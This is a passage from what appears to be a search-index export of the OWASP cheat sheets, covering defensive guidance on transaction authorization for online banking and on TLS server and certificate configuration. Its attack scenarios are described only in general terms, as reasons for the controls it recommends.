2.6 Skipping authorization check in the transaction entry process (see. paragraph 2.5) 2.9 Authorization credentials should be valid only by limited period of time \u00b6 In some malware attacks scenarios, authorization credentials entered by the user is passed to malware command and control server (C&C) and then used from an attacker-controlled machine. Such a process is often performed manually by an attacker. To make such attacks difficult, the server should allow authorizing the transaction only in a limited time window between generating of challenge or OTP and the transaction authorization. Additionally, such safeguard will also aid in preventing resource exhaustion attacks. The time window should be carefully selected to not disrupt normal users' behavior. 2.10 Authorization credentials should be unique for every operation \u00b6 To prevent all sorts of replay attacks, authorization credentials should be unique for every operation. It could be achieved using different methods depending on the applied transaction authorization mechanism. For example: using a timestamp, a sequence number or a random value in signed transaction data or as a part of a challenge. Remarks \u00b6 We identify other issues that should be taken into consideration while implementing transaction authorization. However we deem to be beyond the scope of this cheat sheet: Which transactions should be authorized? All transactions or only some of them. Each application is different and an application owner should decide if all transactions should be authorized or only some of them, considering risk analysis, risk exposition of given application, and other safeguards implemented in an application. We recommend the use of cryptographic operations to protect transactions and to ensure integrity, confidentiality and non-repudiation. Device enrolment or \"pairing\" of an external authorization device (or a mobile application) with the user account. Provisioning & protection of the device signing keys, during device \"pairing\" is as critical as the signing protocol itself. Malware may attempt to inject/replace or steal the signing keys. User awareness. E.g.: For transaction authorization methods, when a user types-in significant transaction data to an authorization component (e.g. an external dedicated device or a mobile application), users should be trained to rewrite transaction data from trusted source and not from a computer screen. There are some anti-malware solutions that protect against malware threats but such solutions do not guarantee 100% effectiveness and should be used only as an additional layer of protection. Protection of the signing keys using a second factor either be password, biometric, etc.. Protection of the signing keys leveraging secure elements (TEE, TPM, Smart card..) References and future reading \u00b6 References and future reading: Wojciech Dworakowski: E-banking transaction authorization - possible vulnerabilities, security verification and best practices for implementation. Presentation from AppSec EU 2015 . Saar Drimer, Steven J. Murdoch, and Ross Anderson: Optimised to Fail - Card Readers for Online Banking . Jakub Ka\u0142u\u017cny, Mateusz Olejarka: Script-based Malware Detection in Online Banking Security Overview . List of websites and whether or not they support 2FA . Laerte Peotta, Marcelo D. Holtz, Bernardo M. David, Flavio G. Deus, Rafael Tim\u00f3teo de Sousa Jr: A Formal Classification Of Internet Banking Attacks and Vulnerabilities . Marco Morana, Tony Ucedavelez: Threat Modeling of Banking Malware-Based Attacks . OWASP Anti-Malware - Knowledge Base . OWASP Anti-Malware Project - Awareness Program . Arjan Blom , Gerhard de Koning Gans , Erik Poll , Joeri de Ruiter , and Roel Verdult: Designed to Fail - A USB-Connected Reader for Online Banking .","title":"Transaction Authorization"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#transaction-authorization-cheat-sheet","text":"","title":"Transaction Authorization Cheat Sheet"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#purpose-and-audience","text":"The Purpose of this cheat sheet is to provide guidelines on how to securely implement transaction authorization to protect it from being bypassed. These guidelines can be used by: Banks - to define functional and non-functional requirements for transaction authorization. Developers \u2013 to design and implement transaction authorization without vulnerabilities. Pentesters \u2013 to test for transaction authorization security.","title":"Purpose and audience"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#introduction","text":"Some applications use a second factor to check whether an authorized user is performing sensitive operations. A common example is wire transfer authorization, typically used in online or mobile banking applications. For the purpose of this document we will call that process: transaction authorization . Usage scenarios are not only limited to financial systems. For example: an email with a secret code or a link with some kind of token to unlock a user account is also a special case of transaction authorization. A user authorizes the operation of account unlocking by using a second factor (a unique code sent to his email address). Transaction authorization can be implemented using various methods, e.g.: Cards with transaction authorization numbers (TAN), Time based OTP tokens, such as OATH TOTP (Time-based One-Time Password) , OTP sent by SMS or provided by phone Digital signature using e.g. a smart card or a smart phone, Challenge-response tokens, including unconnected card readers or solutions which scan transaction data from the user's computer screen. Some of these can be implemented on a physical device or in a mobile application. Transaction authorization is implemented in order to protect for unauthorized wire transfers as a result of attacks using malware, phishing, password or session hijacking, CSRF, XSS, etc.. Unfortunately, as with any piece of code, this protection can be improperly implemented and as a result it might be possible to bypass this safeguard.","title":"Introduction"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#1-functional-guidelines","text":"","title":"1. Functional Guidelines"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#11-transaction-authorization-method-has-to-allow-a-user-to-identify-and-acknowledge-significant-transaction-data","text":"User's computers cannot be trusted due to malware threats. Hence a method that prevents a user from identifying transaction on an external device cannot be considered as secure. Transaction data should be presented and acknowledged using an external authorization component. Such a transaction authorization components should be build using the What You See Is What You Sign principle. When a user authorizes a transaction he needs to know what he is authorizing. Based on this principle, an authorization method must permit a user to identify and acknowledge the data which are significant to a given transaction. For example, in the case of a wire transfer: the target account and amount. The decision about which transaction data can be considered as significant should be chosen based on: The real risk, The technical capabilities and constraints of the chosen authorization method, Positive user experience. For example when an SMS message is used to send significant transaction data, it is possible to send the target account, amount and type of transfer. However, for an unconnected CAP reader it is perceived to be inconvenient for a user to enter these data. In such cases, entering only the most significant transaction data (e.g. partial target account number and amount) can be considered sufficient. In general, significant transaction data should always be presented as an inherent part of the transaction authorization process. Whereas the user experience should be designed to encourage users to verify the transaction data. If a transaction authentication process requires a user to enter transaction data into an external device, the user should be prompted for providing specific value (e.g. a target account number). Entering a value without meaningful prompt could be easily abused by malware using social engineering techniques as described in the example in paragraph 1.4. Also, for more detailed discussion of input overloading problems, see here .","title":"1.1 Transaction authorization method has to allow a user to identify and acknowledge significant transaction data"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#12-change-of-authorization-token-should-be-authorized-using-the-current-authorization-token","text":"When a user is allowed to change authorization token by using the application interface, the operation should be authorized by using his current authorization credentials (as is the case with password change procedure ). For example: when a user changes a phone number for SMS codes an authorization SMS code should be sent to the current phone number.","title":"1.2 Change of authorization token should be authorized using the current authorization token"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#13-change-of-authorization-method-should-be-authorized-using-the-current-authorization-method","text":"Some applications allow a user to chose between multiple methods of transaction authorization. In such cases, the user should authorize the change in authorization method using his current authorization method. Otherwise, malware may change the authorization method to the most vulnerable method. Additionally, the application should inform the user about the potential dangers associated to the selected authorization method.","title":"1.3 Change of authorization method should be authorized using the current authorization method"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#14-users-should-be-able-to-easily-distinguish-the-authentication-process-from-the-transaction-authorization-process","text":"Malware can trick users in authorizing fraudulent operations, when an application requires a user to perform the same actions for authentication as for transaction authorization. Consider the following example: An application is using the same method for user authentication (usually as a second factor to traditional login/password) and for transaction authorization. E.g. by using a OTP token, Challenge-response codes, operation signing using external smartcard, ... A malware may present the user a false error message after the first step (authentication to the application) and trick the user into repeating the authentication procedure. The first authentication code will be used by the malware for authentication, whereas the second code would be used to authorize a fraudulent transaction. Even challenge-response schemes could be abused using this scenario as malware can present a challenge taken from a fraudulent transaction and trick the user to provide response. Such an attack scenario is used widely in malware attacks against electronic banking . In the abovementioned scenario, the same method was used to authenticate the user and to authorize the transaction. Malware can abuse this behavior to extract transaction authorization credentials without the user's knowledge. Social engineering methods can be used despite utilized authentication and operation authorization methods but the application shouldn't simplify such attack scenarios. Safeguards should allow the user to easily distinguish authentication from transaction authorization. This could be achieved by: Using different methods to authenticate and to authorize, Or using different actions in an external security component (e.g. different mode of operation in CAP reader), Or presenting the user a clear message about what they are \"signing\" (What You See Is What You Sign Principle).","title":"1.4 Users should be able to easily distinguish the authentication process from the transaction authorization process"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#15-each-transaction-should-be-authorized-using-unique-authorization-credentials","text":"Some applications are asking for transaction authorization credentials only once, e.g. static password, code sent through SMS, token response. Afterwards a user is able to authorize any transaction during the whole user's session or at least he has to reuse the same credentials each time he needs to authorize a transaction. Such behavior is not sufficient to prevent malware attacks because malware will sniff such credentials and use them to authorize any transaction without the user's knowledge.","title":"1.5 Each transaction should be authorized using unique authorization credentials"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#2-non-functional-guidelines","text":"","title":"2. Non-functional guidelines"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#21-authorization-should-be-performed-and-enforced-server-side","text":"As for all other security controls transaction authorization should be enforced server-side. By no means it should be possible to influence the authorization result by altering data which flows from a client to a server, e.g. by: Tampering with parameters that contain transaction data, Adding/removing parameters which will disable authorization check, Causing an error. To achieve this, security programming best practices should be applied, such as: Default deny . Avoiding debugging functionality in production code. To avoid tampering, additional safeguards should be considered. For example by cryptographically protecting the data for confidentiality and integrity and while decrypting and verifying the data server side.","title":"2.1 Authorization should be performed and enforced server-side"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#22-authorization-method-should-be-enforced-server-side","text":"When multiple transaction authorization methods are available to the user. The server should enforce the use of the current authorization method chosen by the user in the application settings or enforced by application policies. It should be impossible to change an authorization method by manipulating the parameters provided from the client. Otherwise, malware can downgrade an authorization method to a less or even the least secure authorization method. This is especially important when an application is developed to add a new, more secure authorization method. It is not very rare,that a new authorization method is built on top of an old codebase. As a result, when a client is sending parameters using the old method, the transaction may be authorized, despite the fact that the user has already switched to a new method.","title":"2.2 Authorization method should be enforced server side"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#23-transaction-verification-data-should-be-generated-server-side","text":"When significant transaction data are transmitted programmatically to an authorization component, extra care should be put into denying client modifications on the transaction data at authorization. Significant transaction data that has to be verified by the user, should be generated and stored on a server, then passed to an authorization component without any possibility of tampering by the client. A common anti pattern is to collect significant transaction data client-side and pass it to the server. In such cases, malware can manipulate these data and as a result, show faked transaction data in an authorization component.","title":"2.3 Transaction verification data should be generated server-side"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#24-application-should-prevent-authorization-credentials-brute-forcing","text":"When transaction authorization credentials are sent to the server for verification, an application has to prevent brute-forcing. The transaction authorization process must be restarted after number of failed authorization attempts. In addition other anti brute-forcing and anti-automation techniques should be considered to prevent an attacker from automating his attacks,see OWASP Authentication Cheat Sheet .","title":"2.4 Application should prevent authorization credentials brute-forcing"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#25-application-should-control-which-transaction-state-transitions-are-allowed","text":"Transaction authorization is usually performed in multiple steps, e.g.: The user enters the transaction data. The user requests authorization. The application initializes an authorization mechanism. The user verifies/confirms the transaction data. The user responds with the authorization credentials. The application validates authorization and executes a transaction. An application should process such business logic flow in sequential step order and preventing a user from performing these steps out of order or in even skipping any of these steps (see OWASP ASVS requirement 15.1 ). This should protect against attack techniques such as: Overwriting transaction data before user will enter the authorization credentials, Skipping transaction authorization.","title":"2.5 Application should control which transaction state transitions are allowed"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#26-transaction-data-should-be-protected-against-modification","text":"The transaction authorization process should protect against attack scenarios that modify transaction data after the initial entry by the user. For example, a bad implementation of a transaction authorization process may allow the following attacks (for reference, see steps of transaction authorization described in paragraph 2.5): Replaying step 1 (sending transaction data) in the background and overwriting transaction details with fraudulent transaction, before the user enters authorization credentials. Adding parameters with transaction data to a HTTP request which authorizes the transaction. In such a case, poor implementation will authorize the initial transaction and then execute a fraudulent transaction (specific example of Time of Check to Time of Use vulnerability ). The protection against modification could be implemented using various techniques depending on the framework used, but one or more of the following should be present: Any modification of transaction data should trigger invalidation of any previously entered authorization data. E.g. Generated OTP or challenge is invalidated. Any modification of transaction data should trigger reset of the authorization process. Any attempts to modify transaction data after the initial entry by the user is a symptom of tinkering with an application and should be logged, monitored and carefully investigated.","title":"2.6 Transaction data should be protected against modification"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#27-confidentiality-of-the-transaction-data-should-be-protected-during-any-client-server-communications","text":"The transaction authorization process should protect the privacy of transaction data being presented to the user to authorize i.e. at section 2.5, steps 2 and 4.","title":"2.7 Confidentiality of the transaction data should be protected during any client / server communications"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#28-when-a-transaction-is-executed-the-system-should-check-whether-it-was-authorized","text":"The result of the transaction entry and the authorization process described in paragraph 2.5 is the transaction execution. Just before the transaction is executed there should be a final control gate which verifies whether the transaction was properly authorized by the user. Such control, tied to execution, should prevent attacks such as: Time of Check to Time of Use (TOCTOU) \u2013 example in paragraph 2.6 Skipping authorization check in the transaction entry process (see. paragraph 2.5)","title":"2.8 When a transaction is executed, the system should check whether it was authorized"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#29-authorization-credentials-should-be-valid-only-by-limited-period-of-time","text":"In some malware attacks scenarios, authorization credentials entered by the user is passed to malware command and control server (C&C) and then used from an attacker-controlled machine. Such a process is often performed manually by an attacker. To make such attacks difficult, the server should allow authorizing the transaction only in a limited time window between generating of challenge or OTP and the transaction authorization. Additionally, such safeguard will also aid in preventing resource exhaustion attacks. The time window should be carefully selected to not disrupt normal users' behavior.","title":"2.9 Authorization credentials should be valid only by limited period of time"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#210-authorization-credentials-should-be-unique-for-every-operation","text":"To prevent all sorts of replay attacks, authorization credentials should be unique for every operation. It could be achieved using different methods depending on the applied transaction authorization mechanism. For example: using a timestamp, a sequence number or a random value in signed transaction data or as a part of a challenge.","title":"2.10 Authorization credentials should be unique for every operation"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#remarks","text":"We identify other issues that should be taken into consideration while implementing transaction authorization. However we deem to be beyond the scope of this cheat sheet: Which transactions should be authorized? All transactions or only some of them. Each application is different and an application owner should decide if all transactions should be authorized or only some of them, considering risk analysis, risk exposition of given application, and other safeguards implemented in an application. We recommend the use of cryptographic operations to protect transactions and to ensure integrity, confidentiality and non-repudiation. Device enrolment or \"pairing\" of an external authorization device (or a mobile application) with the user account. Provisioning & protection of the device signing keys, during device \"pairing\" is as critical as the signing protocol itself. Malware may attempt to inject/replace or steal the signing keys. User awareness. E.g.: For transaction authorization methods, when a user types-in significant transaction data to an authorization component (e.g. an external dedicated device or a mobile application), users should be trained to rewrite transaction data from trusted source and not from a computer screen. There are some anti-malware solutions that protect against malware threats but such solutions do not guarantee 100% effectiveness and should be used only as an additional layer of protection. Protection of the signing keys using a second factor either be password, biometric, etc.. Protection of the signing keys leveraging secure elements (TEE, TPM, Smart card..)","title":"Remarks"},{"location":"cheatsheets/Transaction_Authorization_Cheat_Sheet.html#references-and-future-reading","text":"References and future reading: Wojciech Dworakowski: E-banking transaction authorization - possible vulnerabilities, security verification and best practices for implementation. Presentation from AppSec EU 2015 . Saar Drimer, Steven J. Murdoch, and Ross Anderson: Optimised to Fail - Card Readers for Online Banking . Jakub Ka\u0142u\u017cny, Mateusz Olejarka: Script-based Malware Detection in Online Banking Security Overview . List of websites and whether or not they support 2FA . Laerte Peotta, Marcelo D. Holtz, Bernardo M. David, Flavio G. Deus, Rafael Tim\u00f3teo de Sousa Jr: A Formal Classification Of Internet Banking Attacks and Vulnerabilities . Marco Morana, Tony Ucedavelez: Threat Modeling of Banking Malware-Based Attacks . OWASP Anti-Malware - Knowledge Base . OWASP Anti-Malware Project - Awareness Program . Arjan Blom , Gerhard de Koning Gans , Erik Poll , Joeri de Ruiter , and Roel Verdult: Designed to Fail - A USB-Connected Reader for Online Banking .","title":"References and future reading"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html","text":"Transport Layer Protection Cheat Sheet \u00b6 Introduction \u00b6 This cheat sheet provides guidance on how to implement transport layer protection for an application using Transport Layer Security (TLS). When correctly implemented, TLS can provides a number of security benefits: Confidentiality - protection against an attacker from reading the contents of traffic. Integrity - protection against an attacker modifying traffic. Replay prevention - protection against an attacker replaying requests against the server. Authentication - allowing the client to verify that they are connected to the real server (note that the identity of the client is not verified unless client certificates are used). TLS is used by many other protocols to provide encryption and integrity, and can be used in a number of different ways. This cheatsheet is primarily focused on how to use TLS to protect clients connecting to a web application over HTTPS; although much of the guidance is also applicable to other uses of TLS. SSL vs TLS \u00b6 Secure Socket Layer (SSL) was the original protocol that was used to provide encryption for HTTP traffic, in the form of HTTPS. There were two publicly released versions of SSL - versions 2 and 3. Both of these have serious cryptographic weaknesses and should no longer be used. For various reasons the next version of the protocol (effectively SSL 3.1) was named Transport Layer Security (TLS) version 1.0. Subsequently TLS versions 1.1, 1.2 and 1.3 have been released. The terms \"SSL\", \"SSL/TLS\" and \"TLS\" are frequently used interchangeably, and in many cases \"SSL\" is used when referring to the more modern TLS protocol. This cheatsheet will use the term \"TLS\" except where referring to the legacy protocols. Server Configuration \u00b6 Only Support Strong Protocols \u00b6 The SSL protocols have a large number of weaknesses, and should not be used in any circumstances. General purpose web applications should only support TLS 1.2 and TLS 1.3, with all other protocols disabled. Where it is known that a web server must support legacy clients with unsupported an insecure browsers (such as Internet Explorer 10), it may be necessary to enable TLS 1.0 to provide support. Where legacy protocols are required, the \"TLS_FALLBACK_SCSV\" extension should be enabled in order to prevent downgrade attacks against clients. Note that PCI DSS forbids the use of legacy protocols such as TLS 1.0 . Only Support Strong Ciphers \u00b6 There are a large number of different ciphers (or cipher suites) that are supported by TLS, that provide varying levels of security. Where possible, only GCM ciphers should be enabled. However, if it is necessary to support legacy clients, then other ciphers may be required. At a minimum, the following types of ciphers should always be disabled: Null ciphers Anonymous ciphers EXPORT ciphers See the TLS Cipher String Cheat Sheet for full details on securely configuring ciphers. Use Strong Diffie-Hellman Parameters \u00b6 Where ciphers that use the ephemeral Diffie-Hellman key exchange are in use (signified by the \"DHE\" or \"EDH\" strings in the cipher name) sufficiently secure Diffie-Hellman parameters (at least 2048 bits) should be used The following command can be used to generate 2048 bit parameters: openssl dhparam 2048 -out dhparam2048.pem The Weak DH website provides guidance on how various web servers can be configured to use these generated parameters. Disable Compression \u00b6 TLS compression should be disabled in order to protect against a vulnerability (nicknamed CRIME ) which could potentially allow sensitive information such as session cookies to be recovered by an attacker. Patch Cryptographic Libraries \u00b6 As well as the vulnerabilities in the SSL and TLS protocols, there have also been a large number of historic vulnerability in SSL and TLS libraries, with Heartbleed being the most well known. As such, it is important to ensure that these libraries are kept up to date with the latest security patches. Test the Server Configuration \u00b6 Once the server has been hardened, the configuration should be tested. The OWASP Testing Guide chapter on SSL/TLS Testing contains further information on testing. There are a number of online tools that can be used to quickly validate the configuration of a server, including: SSL Labs Server Test CryptCheck CypherCraft Hardenize ImmuniWeb Observatory by Mozilla Additionally, there are a number of offline tools that can be used: O-Saft - OWASP SSL advanced forensic tool CipherScan CryptoLyzer SSLScan - Fast SSL Scanner SSLyze testssl.sh - Testing any TLS/SSL encryption tls-scan Certificates \u00b6 Use Strong Keys and Protect Them \u00b6 The private key used to generate the cipher key must be sufficiently strong for the anticipated lifetime of the private key and corresponding certificate. The current best practice is to select a key size of at least 2048 bits. Additional information on key lifetimes and comparable key strengths can be found here and in NIST SP 800-57 . The private key should also be protected from unauthorised access using filesystem permissions and other technical and administrative controls. Use Strong Cryptographic Hashing Algorithms \u00b6 Certificates should use SHA-256 for the hashing algorithm, rather than the older MD5 and SHA-1 algorithms. These have a number of cryptographic weaknesses, and are not trusted by modern browsers. Use Correct Domain Names \u00b6 The domain name (or subject) of the certificate must match the fully qualified name of the server that presents the certificate. Historically this was stored in the commonName (CN) attribute of the certificate. However, modern versions of Chrome ignore the CN attribute, and require that the FQDN is in the subjectAlternativeName (SAN) attribute. For compatibility reasons, certificates should have the primary FQDN in the CN, and the full list of FQDNs in the SAN. Additionally, when creating the certificate, the following should be taken into account: Consider whether the \"www\" subdomain should also be included. Do not include non-qualified hostnames. Do not include IP addresses. Do not include internal domain names on externally facing certificates. If a server is accessible using both internal and external FQDNs, configure it with multiple certificates. Carefully Consider the use of Wildcard Certificates \u00b6 Wildcard certificates can be convenient, however they violate the principal of least privilege , as a single certificate is valid for all subdomains of a domain (such as *.example.org). Where multiple systems are sharing a wildcard certificate, the likelihood that the private key for the certificate is compromised increases, as the key may be present on multiple systems. Additionally, the value of this key is significantly increased, making it a more attractive target for attackers. The issues around the use of wildcard certificates are complicated, and there are various other discussions of them online. When risk assessing the use of wildcard certificates, the following areas should be considered: Only use wildcard certificates where there is a genuine need, rather than for convenience. Consider the use of the ACME to allow systems to automatically request and update their own certificates instead. Never use a wildcard certificates for systems at different trust levels. Two VPN gateways could use a shared wildcard certificate. Multiple instances of a web application could share a certificate. A VPN gateway and a public webserver should not share a wildcard certificate. A public webserver and an internal server should not share a wildcard certificate. Consider the use of a reverse proxy server which performs TLS termination, so that the wildcard private key is only present on one system. A list of all systems sharing a certificate should be maintained to allow them all to be updated if the certificate expires or is compromised. Limit the scope of a wildcard certificate by issuing it for a subdomain (such as *.foo.example.org ), or a for a separate domain. Use an Appropriate Certification Authority for the Application's User Base \u00b6 In order to be trusted by users, certificates must be signed by a trusted certificate authority (CA). For Internet facing applications, this should be one of the CAs which are well-known and automatically trusted by operating systems and browsers. The LetsEncrypt CA provides free domain validated SSL certificates, which are trusted by all major browsers. As such, consider whether there are any benefits to purchasing a certificate from a CA. For internal applications, an internal CA can be used. This means that the FQDN of the certificate will not be exposed (either to an external CA, or publicly in certificate transparency lists). However, the certificate will only be trusted by users who have imported and trusted the internal CA certificate that was used to sign them. Use CAA Records to Restrict Which CAs can Issue Certificates \u00b6 Certification Authority Authorization (CAA) DNS records can be used to define which CAs are permitted to issue certificates for a domain. The records contains a list of CAs, and any CA who is not included in that list should refuse to issue a certificate for the domain. This can help to prevent an attacker from obtaining unauthorised certificates for a domain through a less-reputable CA. Where it is applied to all subdomains, it can also be useful from an administrative perspective by limiting which CAs administrators or developers are able to use, and by preventing them from obtaining unauthorised wildcard certificates. Always Provide All Needed Certificates \u00b6 In order to validate the authenticity of a certificate, the user's browser must examine the certificate that was used to sign it and compare it to the list of CAs trusted by their system. In many cases the certificate is not directly signed by a root CA, but is instead signed by an intermediate CA, which is in turn signed by the root CA. If the user does not know or trust this intermediate CA then the certificate validation will fail, even if the user trusts the ultimate root CA, as they cannot establish a chain of trust between the certificate and the root. In order to avoid this, any intermediate certificates should be provided alongside the main certificate. Consider the use of Extended Validation Certificates \u00b6 Extended validation (EV) certificates claim to provide a higher level of verification of the entity, as they perform checks that the requestor is a legitimate legal entity, rather than just verifying the ownership of the domain name like normal (or \"Domain Validated\") certificates. This can effectively be viewed as the difference between \"This site is really run by Example Company Inc.\" vs \"This domain is really example.org\". Historically these displayed differently in the browser, often showing the company name or a green icon or background in the address bar. However, as of 2019 both Chrome and Firefox have announced that they will be removing these indicators, as they do not believe that EV certificates provide any additional protection. There is no security downside to the use of EV certificates. However, as they are significantly more expensive than domain validated certificates, an assessment should be made to determine whether they provide any additional value Application \u00b6 Use TLS For All Pages \u00b6 TLS should be used for all pages, not just those that are considered sensitive such as the login page. If there are any pages that do not enforce the use of TLS, these could give an attacker an opportunity to sniff sensitive information such as session tokens, or to inject malicious JavaScript into the responses to carry out other attacks against the user. For public facing applications, it may be appropriate to have the web server listening for unencrypted HTTP connections on port 80, and then immediately redirecting them with a permanent redirect (HTTP 301) in order to provide a better experience to users who manually type in the domain name. This should then be supported with the HTTP Strict Transport Security (HSTS) header to prevent them accessing the site over HTTP in the future. Do Not Mix TLS and Non-TLS Content \u00b6 A page that is available over TLS should not include any resources (such as JavaScript or CSS) files which are loaded over unencrypted HTTP. These unencrypted resources could allow an attacker to sniff session cookies or inject malicious code into the page. Modern browsers will also block attempts to load active content over unencrypted HTTP into secure pages. Use the \"Secure\" Cookie Flag \u00b6 All cookies should be marked with the \" Secure \" attribute, which instructs the browser to only send them over encrypted HTTPS connections, in order to prevent them from being sniffed from an unencrypted HTTP connection. This is important even if the website does not listen on HTTP (port 80), as an attacker performing an active man in the middle attack could present a spoofed webserver on port 80 to the user in order to steal their cookie. Prevent Caching of Sensitive Data \u00b6 Although TLS provides protection of data while it is in transit, it does not provide any protection for data once it has reached the requesting system. As such, this information may be stored in the cache of the user's browser, or by any intercepting proxies which are configured to perform TLS decryption. Where sensitive data is returned in responses, HTTP headers should be used to instruct the browser and any proxy servers not to cache the information, in order to prevent it being stored or returned to other users. This can be achieved by setting the following HTTP headers in the response: Cache-Control: no-cache, no-store, must-revalidate Pragma: no-cache Expires: 0 Use HTTP Strict Transport Security \u00b6 HTTP Strict Transport Security (HSTS) instructs the user's browser to always request the site over HTTPS, and also prevents the user from bypassing certificate warnings. See the HTTP Strict Transport Security cheatsheet for further information on implementing HSTS. Consider the use of Client-Side Certificates \u00b6 In a typical configuration, TLS is used with a certificate on the server so that the client is able to verify the identity of the server, and to provide an encrypted connection between them. However, there are two main weaknesses with this approach: The server does not have any mechanism to verify the identity of the client The connection can be intercepted by an attacker who is able to obtain a valid certificate for the domain. This is most commonly used by businesses to carry out inspection of TLS traffic by installing a trusted CA certificate on there client systems. Client certificates address both of these issues by requiring that the client proves their identity to the server with their own certificate. This not only provides strong authentication of the identity of the client, but also prevents an intermediate party from performing TLS decryption, even if they have trusted CA certificate on the client system. Client certificates are rarely used on public systems due to a number of issues: Issuing and managing client certificates introduces significant administrative overheads. Non-technical users may struggle to install client certificates. TLS decryption used by many organisations will cause client certificate authentication to fail. However, they should be considered for high-value applications or APIs, especially where there are a small number of technically sophisticated users, or where all users are part of the same organisation. Consider Using Public Key Pinning \u00b6 Public key pinning can be used to provides assurance that the server's certificate is not only valid and trusted, but also that it matches the certificate expected for the server. This provides protection against an attacker who is able to obtain a valid certificate, either by exploiting a weakness in the validation process, compromising a trusted certificate authority, or having administrative access to the client. Public key pinning was added to browsers in the HTTP Public Key Pinning (HPKP) standard. However, due to a number of issues, it has subsequently been deprecated and is no longer recommended or supported by modern browsers . However, public key pinning can still provide security benefits for mobile applications, thick clients and server-to-server communication. This is discussed in further detail in the Pinning Cheat Sheet . Related Articles \u00b6 OWASP - TLS Cipher String Cheat Sheet OWASP - Testing for SSL-TLS , and OWASP Guide to Cryptography OWASP - Application Security Verification Standard (ASVS) - Communication Security Verification Requirements (V9) Mozilla - Mozilla Recommended Configurations NIST - SP 800-52 Rev. 1 Guidelines for the Selection, Configuration, and Use of Transport Layer Security (TLS) Implementations NIST - NIST SP 800-57 Recommendation for Key Management, Revision 3 , Public DRAFT NIST - SP 800-95 Guide to Secure Web Services IETF - RFC 5280 Internet X.509 Public Key Infrastructure Certificate and Certificate Revocation List (CRL) Profile IETF - RFC 2246 The Transport Layer Security (TLS) Protocol Version 1.0 (JAN 1999) IETF - RFC 4346 The Transport Layer Security (TLS) Protocol Version 1.1 (APR 2006) IETF - RFC 5246 The Transport Layer Security (TLS) Protocol Version 1.2 (AUG 2008) Bettercrypto - Applied Crypto Hardening: HOWTO for secure crypto settings of the most common services)","title":"Transport Layer Protection"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#transport-layer-protection-cheat-sheet","text":"","title":"Transport Layer Protection Cheat Sheet"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#introduction","text":"This cheat sheet provides guidance on how to implement transport layer protection for an application using Transport Layer Security (TLS). When correctly implemented, TLS can provides a number of security benefits: Confidentiality - protection against an attacker from reading the contents of traffic. Integrity - protection against an attacker modifying traffic. Replay prevention - protection against an attacker replaying requests against the server. Authentication - allowing the client to verify that they are connected to the real server (note that the identity of the client is not verified unless client certificates are used). TLS is used by many other protocols to provide encryption and integrity, and can be used in a number of different ways. This cheatsheet is primarily focused on how to use TLS to protect clients connecting to a web application over HTTPS; although much of the guidance is also applicable to other uses of TLS.","title":"Introduction"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#ssl-vs-tls","text":"Secure Socket Layer (SSL) was the original protocol that was used to provide encryption for HTTP traffic, in the form of HTTPS. There were two publicly released versions of SSL - versions 2 and 3. Both of these have serious cryptographic weaknesses and should no longer be used. For various reasons the next version of the protocol (effectively SSL 3.1) was named Transport Layer Security (TLS) version 1.0. Subsequently TLS versions 1.1, 1.2 and 1.3 have been released. The terms \"SSL\", \"SSL/TLS\" and \"TLS\" are frequently used interchangeably, and in many cases \"SSL\" is used when referring to the more modern TLS protocol. This cheatsheet will use the term \"TLS\" except where referring to the legacy protocols.","title":"SSL vs TLS"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#server-configuration","text":"","title":"Server Configuration"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#only-support-strong-protocols","text":"The SSL protocols have a large number of weaknesses, and should not be used in any circumstances. General purpose web applications should only support TLS 1.2 and TLS 1.3, with all other protocols disabled. Where it is known that a web server must support legacy clients with unsupported an insecure browsers (such as Internet Explorer 10), it may be necessary to enable TLS 1.0 to provide support. Where legacy protocols are required, the \"TLS_FALLBACK_SCSV\" extension should be enabled in order to prevent downgrade attacks against clients. Note that PCI DSS forbids the use of legacy protocols such as TLS 1.0 .","title":"Only Support Strong Protocols"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#only-support-strong-ciphers","text":"There are a large number of different ciphers (or cipher suites) that are supported by TLS, that provide varying levels of security. Where possible, only GCM ciphers should be enabled. However, if it is necessary to support legacy clients, then other ciphers may be required. At a minimum, the following types of ciphers should always be disabled: Null ciphers Anonymous ciphers EXPORT ciphers See the TLS Cipher String Cheat Sheet for full details on securely configuring ciphers.","title":"Only Support Strong Ciphers"},{"location":"cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#use-strong-diffie-hellman-parameters","text":"Where ciphers that use the ephemeral Diffie-Hellman key exchange are in use (signified by the \"DHE\" or \"EDH\" strings in the cipher name) sufficiently secure Diffie-Hellman parameters (at least 2048 bits) should be used The following command can be used to generate 2048 bit parameters: openssl dhparam 2048 -out dhparam2048.pem The Weak DH website provides guidance on how various web servers can be configured to use these generated parameters.","title":"Use Strong Diffie-Hellman 